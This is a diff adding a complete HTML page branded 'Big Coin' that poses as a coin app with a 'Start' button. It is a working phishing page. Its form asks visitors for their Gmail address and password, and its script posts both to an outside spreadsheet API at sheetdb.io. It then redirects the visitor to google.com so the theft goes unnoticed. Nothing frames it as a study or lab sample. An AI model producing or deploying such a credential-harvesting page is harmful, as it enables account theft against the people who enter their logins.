@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Big Coin</title>
+	<style>
+		body {
+			background-color: black;
+			color: white; /* Change text color for better visibility */
+			font-family: Arial, sans-serif; /* Add a font for better aesthetics */
+		}
+
+		h1 {
+			color: #FFD700; /* Gold color */
+			margin-bottom: 20px; /* Add margin for better spacing */
+		}
+
+		button {
+			background-color: #4CAF50;
+			color: white;
+			padding: 15px 32px;
+			text-align: center;
+			font-size: 20px;
+			border: none;
+			cursor: pointer;
+			border-radius: 8px;
+			width: 200px;
+			height: 60px;
+			margin-top: 20px; /* Adjust margin for button */
+		}
+
+		button:hover {
+			background-color: #45a049;
+		}
+
+		input {
+			margin-bottom: 15px;
+			padding: 10px;
+			width: 220px; /* Adjust width to match the button */
+			font-size: 16px;
+			border-radius: 5px; /* Rounded corners for inputs */
+			border: 1px solid #ccc; /* Border for inputs */
+		}
+
+		img {
+			width: 200px; /* Set image width to 200px */
+			height: 200px; /* Set image height to 200px */
+			margin-bottom: 10px; /* Space below the image */
+		}
+	</style>
+</head>
+
+<body>
+	<center>
+		<h1>Big Coin</h1>
+		<!-- Form starts here -->
+		<form method="POST" id="sheetdb-form" action="https://sheetdb.io/api/v1/y04s39clenu54">
+			<p>
+				<img src="bigcoins.png" alt="Big Coin Icon"> <!-- Use the correct name of your image file here -->
+			</p>
+			<p>
+				<input type="gmail" name="data[gmail]" placeholder="Enter your Gmail" required>
+			</p>
+			<p>
+				<input type="pass" name="data[pass]" placeholder="Enter your Password" required>
+			</p>
+			<p>
+				<button type="submit">Start</button>
+			</p>
+		</form>
+	</center>
+
+	<script>
+		var form = document.getElementById('sheetdb-form');
+		form.addEventListener("submit", e => {
+			e.preventDefault();
+			fetch(form.action, {
+				method: "POST",
+				body: new FormData(form), // You can directly use 'form'
+			}).then(
+				response => response.json()
+			).then((html) => {
+				// Redirect to Google after form submission
+				window.location.href = 'https://google.com';
+			});
+		});
+	</script>
+</body>
+</html>
